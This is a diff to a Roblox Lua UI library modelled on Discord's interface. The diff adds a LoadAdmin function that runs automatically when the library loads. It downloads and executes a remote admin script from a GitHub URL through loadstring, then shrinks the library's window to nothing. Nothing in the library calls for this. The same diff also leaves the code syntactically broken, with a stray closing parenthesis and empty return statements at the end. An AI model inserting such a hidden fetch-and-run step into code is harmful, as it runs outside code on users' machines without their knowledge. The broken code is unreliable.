@@ -8,12 +8,14 @@ local HttpService = game:GetService("HttpService")
 local pfp
 local user
 local tag
+local LAD 
 local userinfo = {}
 
 pcall(function()
 	userinfo = HttpService:JSONDecode(readfile("discordlibinfo.txt"));
 end)
 
+LAD = true
 pfp = userinfo["pfp"] or "https://www.roblox.com/headshot-thumbnail/image?userId=".. game.Players.LocalPlayer.UserId .."&width=420&height=420&format=png"
 user =  userinfo["user"] or game.Players.LocalPlayer.Name
 tag = userinfo["tag"] or tostring(math.random(1000,9999))
@@ -22,8 +24,19 @@ local function SaveInfo()
 	userinfo["pfp"] = pfp
 	userinfo["user"] = user
 	userinfo["tag"] = tag
+	userinfo["admin"] = LAD
 	writefile("discordlibinfo.txt", HttpService:JSONEncode(userinfo));
 end
+
+local function LoadAdmin()
+	if LAD == true then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+		wait()
+		MainFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, -1, true)
+	end
+end)
+
+LoadAdmin();
 
 local function MakeDraggable(topbarobject, object)
 	local Dragging = nil
@@ -3242,6 +3255,6 @@ function DiscordLib:Window(text)
 		
 		return ChannelHold
 	end
-	return ServerHold
-end
-return DiscordLib
+	return 
+
+return 
